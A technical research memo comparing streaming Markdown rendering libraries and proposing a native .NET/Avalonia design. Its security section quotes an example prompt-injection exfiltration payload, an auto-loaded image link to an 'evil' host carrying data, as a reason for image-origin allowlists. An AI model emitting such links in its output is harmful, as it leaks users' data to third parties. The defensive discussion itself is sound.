# Research: streaming Markdown rendering (vercel/streamdown, @lobehub/streamdown, others)

Date: 2026-10-16. All findings below are from source code cloned into
`<research-scratch>/src/`:

| Repo | Local dir | Commit date |
|---|---|---|
| github.com/vercel/streamdown (streamdown 2.7.0, remend 1.4.x) | `vercel_streamdown` | 2026-10-15 |
| github.com/lobehub/streamdown (`@lobehub/streamdown` ~1.4) | `lobehub_streamdown` | 2026-10-15 |
| github.com/lobehub/lobe-ui (Markdown, Highlighter, Mermaid) | `lobehub_lobe-ui` | 2026-10-15 |
| github.com/thetarnav/streaming-markdown (smd) | `thetarnav_streaming-markdown` | — |
| github.com/kingshuaishuai/incremark | `kingshuaishuai_incremark` | 2026-01-22 |

Also already in the same `src` folder (not deeply analysed here): `LiveMarkdown.Avalonia` (Markdig + TextMateSharp + CSharpMath + Mermaider, Append/Clear-only API — the closest existing native prior art), `markdig`, `TextMateSharp`, `Markdown.Avalonia`.

---

## 1. vercel/streamdown

### 1.1 Package layout (`packages/`)

| Package | Role |
|---|---|
| `streamdown` | React component. Deps: `marked` (block lexer only), `unified`/`remark-parse`/`remark-gfm`/`remark-rehype`, `rehype-raw`, `rehype-sanitize`, `rehype-harden`, `hast-util-to-jsx-runtime`, `remend`. |
| `remend` | Standalone string preprocessor ("parse-incomplete-markdown" successor) that heals unterminated markdown. Zero deps. |
| `@streamdown/code` (`streamdown-code`) | Shiki highlighter plugin (JS regex engine, incremental tokenization, LRU cache). |
| `@streamdown/math` | `remark-math` + `rehype-katex` pair; `singleDollarTextMath` default **false**. |
| `@streamdown/mermaid` | Mermaid plugin (lazy-loaded). |
| `@streamdown/cjk` | `remark-cjk-friendly` (+ strikethrough variant) before GFM, autolink CJK-punctuation boundary splitting after GFM. |

Pipeline per render (`packages/streamdown/index.tsx`):

```
children (full string)
  → remend(children)                    // only when mode==="streaming" && parseIncompleteMarkdown
  → preprocessLiteralTagContent / preprocessCustomTags
  → parseMarkdownIntoBlocks()           // marked block lexer, incremental reuse
  → blocks.map(<Block key={id-index} content=...>)  // React.memo per block
      → Markdown: cached unified processor: remark-parse → remark plugins → remark-rehype → rehype plugins → toJsxRuntime
```

Important: **remend runs on the whole document**, before block splitting (vercel). lobehub moves it to only the tail (see §2).

### 1.2 remend — exact healing rules (`packages/remend/src/`)

Entry `index.ts`: trims a single trailing space (keeps `"  "` hard-break), then runs a priority-sorted handler chain; each handler is `string → string`. Custom handlers can be inserted (`{name, handle, priority}`; default 100).

| Priority | Handler | Rule |
|---|---|---|
| 0 | singleTilde | `([\p{L}\p{N}_])~(?!~)(?=[\p{L}\p{N}_])` → escape as `\~` (e.g. `20~25°C`), not in code. |
| 5 | comparisonOperators | In list items `^(\s*(?:[-*+]|\d+[.)]) +)>(=?\s*[$]?\d)` → `\>` (LLM writes `- > 25`, not a blockquote). |
| 10 | htmlTags | Trailing `<[a-zA-Z/][^>]*$` not in code/math → strip it and `trimEnd()`. |
| 15 | setextHeadings | Last line is `-`/`--`/`=`/`==` (1–2 chars, no trailing space) and previous line non-empty → append ZWSP `​` so it is not parsed as a setext underline (would turn the prior paragraph into an H2 for one frame). |
| 20 | links/images | See below. **Early return**: if result ends with `](streamdown:incomplete-link)` / `](streamdown:incomplete-image)`, stop the chain. |
| 30 | boldItalic `***` | If text has no `****` line, trailing `/(\*\*\*)([^*]*?)$/` match with real content, not in code, not HR; odd count of `***` runs (`floor(run/3)`) and `**`/`*` not otherwise balanced → append `***`. |
| 35 | bold `**` | trailing `/(\*\*)([^*]*\*?)$/`; skip if content empty/only markers/whitespace; skip if marker in code or complete inline code; skip if list-item line and content has `\n`; skip if HR. Count prose `**` pairs; odd → append `**` (or `*` if content already ends with `*`). |
| 40 | `__` italic | trailing `(__)([^_]*?)$` + `hasUnmatchedDoubleUnderscore` (run-based parity, ignoring intraword, HR, math, link-URL, html-tag) → append `__`; half-complete `__x_` → append `_`. |
| 41 | `*` italic | find first lone prose `*` that can open (not ws-both-sides, not intraword, next not ws); count single asterisks with CommonMark-ish flanking (`canOpen`, `canClose`, intraword chains); odd → append `*`. |
| 42 | `_` italic | similar; skip intraword `snake_case`, link URLs, math; odd → insert `_` **before trailing newlines**; special case `**…_…**` → `…_**`. |
| 50 | inlineCode | Uses scan: if inside open fence → untouched (renderer shows streaming code). If open span of N backticks with meaningful content: append `N - trailingRun` backticks. |
| 60 | strikethrough | trailing `(~~)([^~]*?)$` with content, odd prose `~~` pairs → `~~`; half `~~x~` → `~`. |
| 70 | block KaTeX `$$` | odd count of prose `$$` → append `$` if text ends with single `$`; else `\n$$` if there is a newline after the first `$$` and text doesn't end in `\n`; else `$$`. |
| 75 | inline KaTeX `$` | **opt-in** (currency ambiguity): odd count of single `$` in prose → append `$`. |

Common guards in every emphasis rule: "don't close if content after marker is empty or only `[\s_~*`]*`" (avoids rendering a lone `**` as an empty strong); never act inside code; never inside math/link URL/HTML tag for `_`.

**Links/images** (`link-image-handler.ts`), iterated up to `MAX_HEAL_PASSES = 32` until fixpoint (idempotence):
- `[text](partial-url` → `[text](streamdown:incomplete-link)`; image `![alt](partial` → `![alt](streamdown:incomplete-image)` (renderer shows a skeleton).
- `[partial text` (no matching `]`, nested brackets handled by depth scan) → `[partial text](streamdown:incomplete-link)`; image → placeholder image.
- `linkMode: "text-only"` → strip the first unmatched `[` instead.
- The `streamdown:` protocol is allow-listed in the sanitize schema so the sentinel survives.

**Linear-time scanner** (`scan.ts`) — the key perf fix (changelog: "Repairing an unclosed, bracket-heavy 58k-char code block drops from ~915ms to ~0.4ms"):
- One pass paints a `Uint8Array regions` per char: `PROSE, FENCE_MARKER, FENCE_INFO, FENCE_BODY, CODE_SPAN, CODE_SPAN_OPEN`. Returns `openFence {char,length,listIndent,quoteDepth}` and `openSpan {start,runLength}`.
- Fence rules follow CommonMark: ``` or ~~~ runs ≥3 at line start after container prefix (blockquote `>` and list markers walked with a forward loop — no backtracking regex); backtick info string cannot contain a backtick; closer = same char, length ≥ opener, only whitespace after; fence ends when the blockquote depth drops or list item indentation ends.
- Inline span: run of N backticks closes only on exactly N; span cannot cross a blank line (paragraph-scoped) or enter a fence.
- Lazy masks built on demand (and skipped via `EMPTY_MASK` when the trigger char is absent): math mask (`$`, `$$`, `\(`, `\[` contexts, ignoring code), link-URL mask (`](` … `)` per line), HTML-tag mask.
- Single-entry memo `getScan(text)` keyed by string identity, cleared in `finally` after remend so long strings aren't retained.
- `matchTrailing()` trick: end-anchored regexes are only run on the slice starting at the last delimiter, so they don't scan the whole doc.

### 1.3 Block splitting + incremental reuse (`lib/parse-blocks.tsx`)

- Uses `new marked.Lexer({gfm:true}).blockTokens(md)` — **block tokenizer only** (skips inline lexing), each block = `token.raw` (lossless concatenation invariant).
- `mergeTokensIntoBlocks`: 
  - HTML block with unclosed tag (stack of tag names, counting nested open/close of same tag, ignoring void elements) → merge subsequent tokens into it until closed.
  - `space` tokens folded into the previous block.
  - If previous block has odd `$$` count (and previous wasn't code) → merge (marked can split a `$$` block on a `=` line as a setext heading).
- Whole document returned as **one block** if footnotes (`[^x]`) or link reference definitions exist (cross-block references would break since each block is its own mdast).
- **Incremental reuse** (single cached entry `lastParse` = one streaming doc at a time):
  ```ts
  // A block is final once it ends with a blank line AND it is followed by another complete block.
  const countStableBlocks = (blocks) => {
    for (let i = blocks.length - 3; i >= 0; i--) if (blocks[i].endsWith("\n\n")) return i + 1;
    return 0;
  };
  // reuse if: input grew, input.slice(0, prev.length) === prev (bulk compare, not startsWith),
  //           no link definitions; verify reused blocks lie at expected offsets;
  //           lex only input.slice(verifiedLength); blocks = prev.blocks[0..stable] ++ tailBlocks
  ```
  Why `length-3`: text before the tail can still change meaning (`#` vs `#x`, `2` vs `2.` continuing a list, setext underline pulling blocks together), so the last two blocks are always re-lexed.
- Strings copied (`" "+s).slice(1)` to avoid V8 substring retention of every intermediate document — .NET analog: don't hold `ReadOnlyMemory` slices of growing buffers.

### 1.4 Memoization

- `Streamdown` = `React.memo` with explicit prop compare (children, theme, isAnimating, mode, plugins…).
- `Block` = `React.memo` comparing `content` string, `index`, `isIncomplete`, `dir`, components (shallow key compare), plugin array identity, presence of animate plugin. Keys = `${useId}-${index}` (index-based; stable since blocks only append).
- Inside a block, every markup component (`MemoP`, `MemoLi`, `MemoCode`, …) is memo'd with `sameRenderedProps` = shallow compare minus the `node` prop (fresh object every parse). Comment: position-based comparison is wrong (same-length replacement keeps positions).
- `ProcessorCache`: LRU(100) of unified processors keyed by serialized plugin names+options (WeakMap per options object) — avoids rebuilding the plugin chain per render.
- Net effect: per token, cost = remend(full doc, linear) + block lex(tail) + one remark/rehype parse of the last block + React reconciliation of last block.

### 1.5 `isAnimating`, incomplete-block context, caret

- `isIncomplete = isAnimating && isLastBlock && hasIncompleteCodeFence(block)` → `BlockIncompleteContext` → `useIsCodeFenceIncomplete()` hook. Code/Mermaid/custom renderers use it to defer expensive work.
- Caret: CSS `::after` with `content: var(--streamdown-caret)` (`" ▋"` or `" ●"`) on last child; hidden when the last block is an open fence or a table (marking the last element with `data-sd-caret-hidden` rather than toggling the container class — toggling restyled the whole document, "tens of ms per flip").
- `onAnimationStart/End` callbacks on `isAnimating` edges.
- Scroll pinning of streaming code blocks/tables done once per frame (not per chunk) to avoid forced layouts.

### 1.6 Animation (`lib/animate.ts`)

- Opt-in `animated` prop: a rehype plugin per block wraps each new word (or char) in `<span data-sd-animate style="--sd-animation:sd-fadeIn;--sd-duration:150ms;--sd-delay:Nms">`. Options: `fadeIn|blurIn|slideUp`, duration 150, stagger 40ms, `sep: word|char`.
- "Already shown" detection by **rendered character count**: each block plugin remembers `committedCharCount` (set in layout effect after paint); text before that offset renders with duration 0.
- CJK: in word mode every Han/Hiragana/Katakana/fullwidth char is its own unit (no spaces).
- Skips `pre`, `svg`, `math`, `annotation`; animates `img`/`hr` as void units; list `::marker` and task checkbox stamped with the first word's timing.
- **Shared timeline across blocks** (`createAnimateTimeline`): `beginPass(now)`, each block `take(wordCount, stagger, now)` returns `{baseDelay, step}`; serialized so sibling blocks don't fade simultaneously; soft backlog budget `MAX_ANIMATION_BACKLOG_MS = 320`, compressing stagger to fit, min step 4ms. StrictMode-safe via mark/rewind.

### 1.7 Code highlighting (`packages/streamdown-code/index.ts`, `lib/code-block/*`)

- Shiki with `createJavaScriptRegexEngine({forgiving:true})` (no WASM Oniguruma), dual themes `[github-light, github-dark]`.
- Highlighter cache: `Map<lang-themeA-themeB, Promise<Highlighter>>`, languages loaded lazily per highlighter.
- `highlight()` is sync-or-callback: returns cached tokens synchronously or `null` and invokes callback later (body shows plain/previous result meanwhile; result ignored if the block moved on).
- **Incremental TextMate tokenization for streaming code** (most transferable idea):
  ```ts
  interface IncrementalState { grammarState; prefix /* completed lines, ends with \n */; rows: ThemedToken[][] }
  // per (language,themes) keep up to 4 states (MRU), pick one whose prefix is a prefix of code
  const lineEnd = code.lastIndexOf("\n") + 1;
  if (lineEnd > prefix.length) {           // tokenize only newly completed lines, continuing grammarState
     completed = codeToTokens(code.slice(prefix.length, lineEnd), { grammarState });
     rows = rows.concat(completed.tokens without trailing empty row); grammarState = completed.grammarState;
  }
  tail = codeToTokens(code.slice(lineEnd), { grammarState }); // partial last line every time
  ```
- Results cache: LRU by **cost** (tokens + lines + chars/64), max cost 300k, max 5000 entries; key includes full code; **streaming (incomplete) results are not cached**.
- Language alias normalization; unknown/truncated language id (e.g. `` ```pyt `` mid-stream) falls back to `text`.
- Code block UI: header with language label, copy button, download button (extension mapping, custom filename), line numbers (meta `startLine=10`, `noLineNumbers`), `codeBlockMaxHeight` (default 400) with streaming auto-scroll, skeleton while lazy component loads. Controls config is a nested `controls` object for code/table/mermaid/image.

### 1.8 Math, Mermaid, tables, security

- Math: `remark-math` (`$$` block, `$…$` only if `singleDollarTextMath`) + `rehype-katex` (errorColor muted). remend closes `$$` so half formulas render via KaTeX (which may show red errors mid-stream — lobehub solves this differently, §2.4).
- Mermaid (`lib/mermaid/index.tsx`): lazy import; `useDeferredRender` = IntersectionObserver (rootMargin 300px) + 300ms debounce + `requestIdleCallback` (500ms timeout); **single-flight latest-wins** rendering while the fence streams, pausing after each render for as long as it took; keeps `lastValidSvg` on error; final render without pause once the fence closes. Controls: download (svg/png/mmd), copy, fullscreen, pan/zoom.
- Tables: copy (Markdown/CSV/TSV, separator incl. locale `auto`), download, fullscreen, `tableMaxHeight` 300.
- Security: `rehype-raw` → `rehype-sanitize` (GitHub schema + `tel`, `streamdown` protocols, `metastring`) → `rehype-harden` (`allowedImagePrefixes`, `allowedLinkPrefixes`, `allowedProtocols`, `defaultOrigin`, `allowDataImages`; all `*` by default). Docs strongly warn: restrict image origins in AI chat (prompt-injection exfiltration via auto-loaded `![](https://evil/?d=…)`). `linkSafety` (default on) = confirmation modal with copy/open + `onLinkCheck` allowlist (sync/async). `disableAutolinkProtocols`, `allowedTags` for custom tags with attribute allowlists, `literalTagContent`.
- Misc: `dir="auto"` per-block RTL detection; i18n `translations`; `prefix` for Tailwind class prefixing.

### 1.9 Perf claims
Benchmarks exist (`__benchmarks__/*.bench.ts`: streamdown-vs-react-markdown, parse-blocks, streaming-rerender, remend, highlight) but no published numbers in-repo; changelog cites concrete fixes (quadratic remend → linear scanner; block-only lexing + reuse; style objects instead of CSS strings per word; caret toggling; per-frame scroll pinning; bounded highlight cache).

---

## 2. @lobehub/streamdown (github.com/lobehub/streamdown)

Not a fork — a **separate, headless** engine (~1.6k LOC src) built on `marked` + `remend` + `react-markdown`-compatible unified pipeline; no styling, no code/mermaid components (those are in lobe-ui). Features: smooth reveal (presets `realtime|balanced|silky`), per-char/word fade, block cache where only the open tail re-renders, LaTeX guard, profiler.

### 2.1 Differences vs vercel

| Concern | vercel | lobehub |
|---|---|---|
| remend scope | whole doc every update | **only the un-frozen tail** (`remend(rawTail)`) |
| block reuse | "ends with \n\n and 2 blocks after" heuristic, single global cache | per-instance `createBlockLexer()` with **type-aware freeze**: token types that can never be extended once followed by a `space` token: `blockquote, code (fenced only), heading, hr, paragraph, table`; lists and indented code are *not* frozen |
| block key | `${id}-${index}` | `${id}-${startOffset}` (absolute offset) |
| input pacing | none (renders every chunk) | `useSmoothStreamContent` adaptive typewriter |
| animation | word/char spans via rehype, shared timeline | per-char "birth timestamps" + negative `animation-delay`, `StreamTail` component |
| math | KaTeX shows errors mid-stream | `latexGuard`: hold last frame whose trailing formula renders |

### 2.2 Block lexer with freeze (`src/blockLexer.ts`) — full logic

```ts
const FROZEN_TYPES = new Set(['blockquote','code','heading','hr','paragraph','table']);
const isFrozenBoundary = (t, next) => next?.type === 'space' && FROZEN_TYPES.has(t.type)
                                      && !(t.type === 'code' && t.codeBlockStyle === 'indented');
createBlockLexer(remendOptions) {
  let frozenRaw = '', frozenBlocks = [];
  return (content) => {
    if (!content.startsWith(frozenRaw)) { frozenRaw = ''; frozenBlocks = []; }  // non-append → reset
    const rawTail = content.slice(frozenRaw.length);
    const processedTail = remend(rawTail, remendOptions);
    const tailTokens = marked.lexer(processedTail);
    const blocks = frozenBlocks.concat(toBlocks(tailTokens, frozenRaw.length));
    // freezePrefix: only freeze tokens that end before the first char remend changed (divergeAt),
    // and only at a frozen-type boundary followed by a space token; never the last token.
    ...
    return { blocks, processed: frozenRaw + processedTail, completeEnd: frozenRaw.length (+separator) };
  };
}
```
Cost per commit ∝ tail length (README: "the cost of a commit grows with the tail, not with the message"). Limitation (documented): footnotes / reference links across blocks stay literal.

### 2.3 Smoothing / typewriter (`src/useSmoothStreamContent.ts`)

Decouples network chunk cadence from display cadence. Displayed string = prefix of target (by code points).
- Presets (balanced): `defaultCps 38, minCps 18, maxCps 72, maxActiveCps 132, flushCps 120, maxFlushCps 280, targetBufferMs 120, minCommitIntervalMs 48, activeInputWindowMs 220, settleAfterMs 360, settleDrain 180–520ms, largeAppendChars 120, emaAlpha 0.2`. realtime: buffer 40ms, commit 32ms; silky: buffer 170ms, commit 56ms.
- Input side (per chunk): EMA of arrival CPS and chunk size; non-append → `syncImmediate`; chunk > `largeAppendChars` → sync immediately; **bypass smoothing while inside an open fence whose language is in `bypassFencedLanguages` (default `html`)**.
- rAF loop: commit interval scales with tail block length: `min(96, minCommit * (1 + tailUnits/256))` — long tails re-render less often (since each commit re-parses the tail).
- Rates: while input active → keep a lag of `baseCps*targetBufferMs` chars (+0.35×chunk EMA), speed = baseCps × clamp(0.6·backlogPressure + 0.25·chunkPressure + 0.15·arrivalPressure, 1, 4.5); when input idle ≥ settleAfterMs → drain remaining backlog within 180–520ms; in between → flush at ≥ flushCps.
- **Block-boundary jump**: if pending text contains a blank line, compute `completeEnd` via the block lexer and reveal everything up to the last complete block at once (never type out already-complete blocks slowly behind).

### 2.4 Fade animation (`useStreamQueue.ts`, `rehypeStreamAnimated.ts`, `StreamTail.tsx`, `styles.tsx`)

- Block states: `revealed | animating | streaming | queued`. When a new block appears, the previous tail is promoted to `revealed` synchronously during render (no frame where it restarts animations). `charDelay = 18 / (1 + 0.3·queueLength)` capped so a block finishes in ≤3000ms.
- Per block runtime keyed by `startOffset`: `births[]` = timestamp per **rendered** char (not raw source chars — markup like URLs/`**` would skew), assigned lazily in the rehype plugin: `births[i] = min(now + capMs, max(births[i-1] + pace, now))`. For the streaming tail, `pace = min(charDelay, max(gap/newChars, 2ms))` where `gap` = observed time since previous commit (16–160ms) — new chars are spread exactly across the inter-commit gap, so motion looks continuous even at ~20 commits/s.
- Shrink handling: when marked drops a trailing `\n`, only truncate births past new length (no replay).
- Rendering: each text run becomes one custom `<streamdown-tail>` element whose component renders the already-faded prefix as plain text and in-flight chars as `<span class="stream-char" style="animation-delay:-elapsed ms">` keyed by char index; style frozen per mounted instance so remounts (p→h2 setext) resume at real elapsed time. Fade = 180ms opacity keyframe `cubic-bezier(0.33,0,0.67,1)`. Settled blocks (revealed + last fade done) drop the plugin entirely and render plain text.
- Skips `pre`, `code`, `svg`, `.katex`. Word mode uses `Intl.Segmenter` (CJK-aware word segmentation). Doc note: word granularity ≈5× fewer animated nodes — "the main CPU lever".
- `prefers-reduced-motion` honored for block fade.

### 2.5 LaTeX (`src/latex.ts`)

- `latexGuard`: `findIncompleteFormula(text)` walks delimiters (skipping backtick spans/fences, handling `\(`/`\[`, `$`, `$$`, escaped `\$`; a single `$` unclosed before a blank line = currency, ignored); if the trailing pending formula fails `katex.renderToString(…, {throwOnError:true})`, render the **previous valid frame** instead. So formulas pop in only when renderable — no raw-TeX flash, no red error.
- `preprocessLaTeX` (used by lobe-ui on full content, cached LRU 50):
  1. `escapeCurrencyDollars`: protect code/`$$…$$`/`$…\…$`/`$1$`/`\[…\]`/`\(…\)` with placeholders, then `$` + money pattern (`$20`, `$1,000.50`, `$20-50`, `$300+`) → `\$`.
  2. `convertLatexDelimiters`: `\[…\]` → `$$…$$`, `\(…\)` → `$…$` (code preserved). This is the `\(...\)` normalization.
  3. `escapeMhchemCommands`: `$\ce{` → `$\\ce{`.
  4. `escapeLatexPipes`: inside `$…$`/`$$…$$` replace unescaped `|` with `\vert{}` so GFM tables don't split cells.
  5. `escapeTextUnderscores`: `\text{a_b}` → `\text{a\_b}`.
  Optional: brace/`\left…\right` balancing, spacing normalization, CJK↔`$` spacing, validation.
- lobe-ui orders remark plugins `remarkCjkFriendly, remarkMath, remarkGfm{singleTilde:false}, …` — math **before** GFM so `|` inside math isn't a table separator.

### 2.6 lobe-ui integration (`src/Markdown/*`, `src/Highlighter/*`, `src/Mermaid/*`, `src/hooks/*`)

- `Markdown` → `StreamdownRender` (if `enableStream && animated`) else `MarkdownRender`. `useDelayedAnimated`: when `animated` flips true→false keep it true for 1s so the tail fade finishes before switching to the static renderer.
- `useStableValue` (deep-equal) for `componentProps`/`components` so inline literals don't remount code blocks/iframes per parent render.
- Components: `pre` → `CodeBlock` (memo on `children` identity): routes `mermaid` → `PreMermaid`, full HTML doc → `HtmlPreview` iframe, single-line ≤32 chars → `PreSingleLine`, else `Pre` (Highlighter with language tag, copy, optional `fullFeatured` header with language select, collapse/expand).
- **Streaming highlighting**: `useStreamHighlight` uses `@shikijs/stream`'s `ShikiStreamTokenizer` (`enqueue(chunk)` → `tokensStable` + `tokensUnstable`); resets on non-append. Lines diffed against previous so unchanged line arrays keep identity → `TokenLine` memo (key line index) → `TokenSpan` memo (key = token offset). Token fade (`tokenFade.ts`): per-source-char births chained like prose; a token's birth = min birth of its chars, and births only move earlier (Shiki re-splits the last ~2 lines as they complete; a char already visible must never re-fade).
- Mermaid: `beautiful-mermaid` `renderMermaidSVG` (synchronous, DOM-free renderer) debounced 300ms while streaming; on error fall back to CDN real mermaid.
- KaTeX: inlined copy of rehype-katex (version pinning), on error re-render with `throwOnError:false, strict:'ignore'`.
- Citations `[1]` → links excluding code/math ranges; custom footnotes; `remark-breaks` in chat variant; `rehype-sanitize` when `allowHtml`.

---

## 3. Other approaches

### 3.1 thetarnav/streaming-markdown (`smd.js`, ~1.7k LOC, 3kB gz)
- True **append-only push parser**: `parser_write(p, chunk)` iterates chars; state = `tokens: Uint32Array(24)` stack of open token types, `pending` (chars that may become a delimiter), `text` buffer, indent/fence/blockquote/table state.
- Renderer interface: `add_token(type)`, `end_token()`, `add_text(text)`, `set_attr(type, value)` — only appends DOM; never mutates existing nodes (selection/copy stable during streaming).
- **Optimistic**: opening `` ` ``/fence immediately styles following text as code; `**` opens bold immediately. O(n) total, O(chunk) per write.
- Trade-off: no retroactive reinterpretation (setext headings, lazy continuation, link reference defs, some table cases) — not CommonMark-exact. Good model for a "fast path" but output must be accepted as approximate.

### 3.2 Incremark (`kingshuaishuai/incremark`, `packages/core`)
- Claims O(n) vs O(n²) re-parse; README benchmark (38 files, 128KB): Incremark 519ms vs Streamdown 3190ms vs markstream 14684ms vs ant-design-x 3729ms (author's numbers).
- `IncremarkParser`: keeps `lines[]` + prefix-sum `lineOffsets[]` updated by splitting **only the new chunk** (no string re-concatenation); `pendingStartLine`; `BlockContext` (inFencedCode, inList, listIndent, listMayEnd, inContainer, depth, …) cached per line.
- `BoundaryDetector.findStableBoundary` runs a checker chain per new line: container end, list end (blank line then non-indented non-item), footnote, new block start (heading, fence, blockquote, list, setext), blank line (not in list). Explicit boundaries (fence start, ATX heading, thematic break) finalize the previous line immediately.
- Completed region parsed once → `completed` blocks (ids = start offset); pending region re-parsed each append → `pending` blocks. Definitions/footnotes managers accumulate across blocks (solves cross-block refs). Engines: marked (default) or micromark.
- `BlockTransformer` typewriter operates on the **AST** (`sliceAst` by char count, plugins for atomic nodes like code/mermaid), rAF with `charsPerTick` (random range), pauses when hidden — reveal never exposes half markup.

### 3.3 Others found
- Rust `mdtext` (docs.rs) — streaming CommonMark/GFM parser for LLM output, claims linear vs pulldown-cmark quadratic (ad hoc benchmark).
- Flutter `streamdown` (pub.dev) — append-only AST, provisional incomplete blocks, claims ~188× vs re-parse (5KB, 4-char chunks).
- Ports: `software-mansion-labs/react-native-streamdown`, `beynar/svelte-streamdown`, `streamdown-vue`, `nstreamdown` (NativeScript), `streamdown-rs`, `phoenix_streamdown`.
- Lezer (`@lezer/common`): `TreeFragment.applyChanges(fragments, changes)` + `parser.startParse(input, fragments)` reuses unchanged subtrees; `@lezer/markdown` supports fragments. Append-only streaming = change at end, so only last block(s) re-parse. Generic proof that "re-parse only from last stable block boundary" is the right granularity.
- markdown-it has no incremental API; common trick is the same block-split-and-memo (what streamdown does with marked).

---

## 4. Transfer to native .NET / Avalonia (NativeAOT)

Concrete design suggestions derived from the above:

1. **Two-level pipeline: append buffer → stable-prefix block list → tail re-parse.** Keep `StringBuilder`/char buffer + line offsets (Incremark). Maintain `frozenBlocks` (immutable, each with `StartOffset`, `Kind`, parsed AST, built visual). Re-parse only `[frozenEnd..]` with Markdig on every commit. Freeze rule = lobehub's type-aware rule (paragraph/heading/fenced code/table/blockquote/hr followed by a blank line, and not the last block; lists and indented code never freeze until a non-continuation line appears) + vercel's verification that reused blocks still sit at the same offsets. Fall back to one-block mode for docs with reference definitions/footnotes, or keep a definitions registry (Incremark) and inject into Markdig's `LinkReferenceDefinitionGroup`.
2. **Port remend as a pure C# `string → string` (or span → builder) healer, applied only to the tail block.** Port the region scanner (`byte[] regions`, open fence/open span, lazy math/link/html masks) — it is ~700 lines, regex-light, trivially AOT-safe (use `[GeneratedRegex]` for the few regexes). Keep the priority-ordered handler list and the sentinel URL scheme (`streamdown:incomplete-link`) so the renderer can draw a skeleton/plain text. Tests: the repo's `__tests__` folder is a ready-made golden corpus.
3. **Stable identity = start offset.** Key block controls by `StartOffset`; reuse the Avalonia control for frozen blocks (never touch them), and diff/patch only the tail block's control subtree (or rebuild it — it's small). Mirrors React.memo-per-block.
4. **Display smoother decoupled from network.** Port `useSmoothStreamContent` as a `DispatcherTimer`/`TopLevel.RequestAnimationFrame` loop: EMA-based CPS, target lag buffer, settle drain, large-append bypass, open-`html`-fence bypass, commit interval scaling with tail length (`min(96, 48·(1+tail/256))` ms), and jump-to-`completeEnd` for completed blocks. This bounds parse+layout work to ~10–30 commits/s regardless of token rate.
5. **Fade-in without per-char controls.** In Avalonia, avoid one control per char. Use a custom `TextLayout`/`InlineCollection` renderer where the tail run is drawn with per-glyph-cluster opacity computed from a `births[]` array (birth chaining: `birth[i] = min(now+cap, max(birth[i-1]+pace, now))`, pace = commitGap/newChars). Render via a custom `Control.Render` with `DrawingContext.PushOpacity` per cluster range or a brush with alpha per run; invalidate only that control at 60 fps while any cluster is younger than 180ms; drop to static text when settled. Word granularity for CJK via `System.Globalization` text elements / ICU-free segmentation (per-char for Han/Kana like vercel's CJK rule).
6. **Incremental code highlighting with TextMateSharp.** TextMateSharp exposes per-line `IStateStack` (`ITokenizeLineResult.RuleStack`) — exactly Shiki's `grammarState`. Cache `(prefixLength, stateStack, rows)` per code block; tokenize only newly completed lines plus the partial last line; don't cache incomplete results; LRU-by-cost cache for finished blocks; unknown/partial language → plain text. Token birth-merging (births only move earlier) to avoid re-fading on re-split.
7. **Math**: use CSharpMath (as LiveMarkdown.Avalonia does). Adopt lobehub's `preprocessLaTeX` (currency escape, `\(\)`/`\[\]` → `$`, `\vert` in pipes, `\text{_}`) and the **latex guard**: try-parse the trailing open formula; if it fails, keep showing the previous frame for that block (or render the formula as a placeholder) instead of raw TeX/error. remend `$$` closing; inline `$` closing opt-in.
8. **Mermaid / heavy blocks**: gate on "fence closed or streaming stopped" (`IsIncomplete` = streaming && last block && open fence); while open, single-flight latest-wins rendering on a background thread with self-timed pause, keep last valid render, and virtualization-aware deferral (only render when near viewport). A pure .NET renderer (Mermaider, like beautiful-mermaid on JS) avoids WebView.
9. **Caret**: draw as an adorner/glyph after the last inline of the tail; hide when tail is an open code fence or table (vercel rule).
10. **Security** (agent client): link click → confirmation unless allow-listed; image loading gated by origin allowlist and `data:` policy (prompt-injection exfiltration); raw HTML not rendered (or a strict allowlist), custom agent tags via explicit allowlist.
11. **CJK**: emphasis flanking fix (`remark-cjk-friendly` semantics — `**中文。**后` should bold) — Markdig has a `CjkFriendlyEmphasis` extension (`UseCjkFriendlyEmphasis()`); autolink boundary at CJK punctuation; single-tilde escape (`20~25`); per-char animation units.
12. **Perf traps observed in JS that map to .NET**: avoid whole-document `StartsWith` per tick (compare lengths + last block only), avoid retaining substrings of each intermediate doc, avoid restyling the whole container to toggle caret, throttle scroll-to-bottom to once per frame, bound caches by cost.
